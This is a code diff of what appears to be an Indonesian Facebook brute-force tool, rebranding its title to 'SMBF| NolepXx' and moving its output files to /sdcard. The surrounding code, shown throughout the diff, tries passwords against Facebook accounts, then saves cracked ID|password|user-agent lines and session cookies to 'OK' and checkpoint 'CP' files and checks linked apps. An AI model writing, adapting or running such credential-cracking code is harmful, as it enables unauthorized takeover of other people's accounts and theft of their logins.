@@ -49,7 +49,7 @@ console = Console()
 ses=requests.Session()
 id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
 ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
-sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
+sys.stdout.write('\x1b]2; SMBF| NolepXx \x07')
 #------------------[ USER-AGENT ]-------------------#
 uman,usman1=[],[]
 pretty.install()
@@ -1245,7 +1245,7 @@ def validate1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1254,7 +1254,7 @@ def validate1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1264,14 +1264,14 @@ def validate1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -1305,13 +1305,13 @@ def validate2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1321,14 +1321,14 @@ def validate2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1362,13 +1362,13 @@ def validate3(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1378,14 +1378,14 @@ def validate3(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1439,13 +1439,13 @@ def reguler1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1455,14 +1455,14 @@ def reguler1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1515,13 +1515,13 @@ def reguler2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1531,14 +1531,14 @@ def reguler2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1591,13 +1591,13 @@ def reguler3(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1607,14 +1607,14 @@ def reguler3(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1668,13 +1668,13 @@ def kontol(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1684,14 +1684,14 @@ def kontol(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1745,13 +1745,13 @@ def bapi(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1761,14 +1761,14 @@ def bapi(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}') 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1803,13 +1803,13 @@ def colmek1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1819,14 +1819,14 @@ def colmek1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -1861,13 +1861,13 @@ def colmek2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{x}{ua}{N}')
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1877,14 +1877,14 @@ def colmek2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}') 
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}[{b}â{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
 				
@@ -1996,7 +1996,7 @@ pwBaru = []
 ubahP = []
 
 def file_cp():
-	dirs = os.listdir('CP')
+	dirs = os.listdir('/sdcard/CP')
 	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(P,til,P,P,P))
 	for file in dirs:
 		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
@@ -2802,9 +2802,9 @@ class sxp_wa:
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('OK')
+	try:os.mkdir('/sdcard/OK')
 	except:pass
-	try:os.mkdir('CP')
+	try:os.mkdir('/sdcard/CP')
 	except:pass
 	try:os.mkdir('/sdcard/DUMP-FILE')
 	except:pass
